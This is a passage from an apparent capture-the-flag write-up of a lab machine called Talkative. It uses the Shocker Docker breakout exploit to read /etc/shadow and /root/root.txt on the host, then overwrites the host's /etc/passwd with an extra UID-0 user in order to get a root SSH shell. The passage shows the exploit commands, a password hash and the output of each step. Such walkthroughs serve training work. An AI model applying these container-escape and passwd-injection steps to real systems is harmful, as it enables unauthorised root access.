saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::

```

#### Read root.txt

I’ll go back into the source, and on line 169, update the file it reads from `/etc/shadow` to `/root/root.txt`:

```

        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");

```

On recompiling and re-uploading, it returns the flag:

```

root@c150397ccd63:~# ./so                           
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'root/root.txt'
...[snip]...
[!] Win! /etc/shadow output follows:
c8c243c5************************

```

### Shocker File Write

#### POC

There’s some ability to write files using Shocker, though I can’t fully explain what’s required. HackTricks has a [version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) that will write files on the host as well! It says that `cap_dac_override` is required for this to work, but it clearly does work on Talkative and that capability isn’t present.

I’ll upload the compiled writing version and run it, giving two files:

```

root@c150397ccd63:~# echo a  > a
root@c150397ccd63:~# ./sw /etc/hostname a

```

I can verify that the `/etc/hostname` file on the host is overwritten from my shell as saul:

```

saul@talkative:/dev/shm$ cat /etc/hostname 
a
lkative

```

Only the first two bytes of the original file are overwritten, which is the size of the file I used.

#### Shell

I’ll use the file write to add another root user to the `/etc/passwd` file. I’ll generate a hash for the password “0xdf”:

```

oxdf@hacky$ openssl passwd -1 0xdf
$1$FWS43Ezm$fKjubC8uKDJ9W9dmD78QP0

```

Now I’ll create a `passwd` line from that, with the user name oxdf, the password hash from above, the user and group ids of 0:

```

oxdf:$1$FWS43Ezm$fKjubC8uKDJ9W9dmD78QP0:0:0:pwned:/root:/bin/bash

```

I’ll recreate the `passwd` file from the host (read by saul) in the container, with the extra line on the end:

```

root@c150397ccd63:~# echo 'root:x:0:0:root:/root:/bin/bash
> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                 
> bin:x:2:2:bin:/bin:/usr/sbin/nologin            
> sys:x:3:3:sys:/dev:/usr/sbin/nologin       
> sync:x:4:65534:sync:/bin:/bin/sync                             
> games:x:5:60:games:/usr/games:/usr/sbin/nologin
> man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
> lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
> mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
> news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
> uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
> proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
> list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
> irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
> gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
> systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
> systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
> systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
> messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
> syslog:x:104:110::/home/syslog:/usr/sbin/nologin
> _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
> tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
> uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
> tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
> landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
> pollinate:x:110:1::/var/cache/pollinate:/bin/false
> usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
> sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
> systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
> lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
> saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash' > passwd
root@c150397ccd63:~# echo 'oxdf:$1$FWS43Ezm$fKjubC8uKDJ9W9dmD78QP0:0:0:pwned:/root:/bin/bash' >> passwd  

```

I’ll run the exploit:

```

root@c150397ccd63:~# ./sw /etc/passwd passwd
...[snip]...
[*] Brute forcing remaining 32bit. This can take a while...
[*] (passwd) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0xb7, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0xb7, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
Success!!

```

It reports success. If it did, I can SSH as oxdf and get a shell as root. It works:

```

saul@talkative:/dev/shm$ ssh oxdf@127.0.0.1
oxdf@127.0.0.1's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-81-generic x86_64)
...[snip]...
root@talkative:~#

```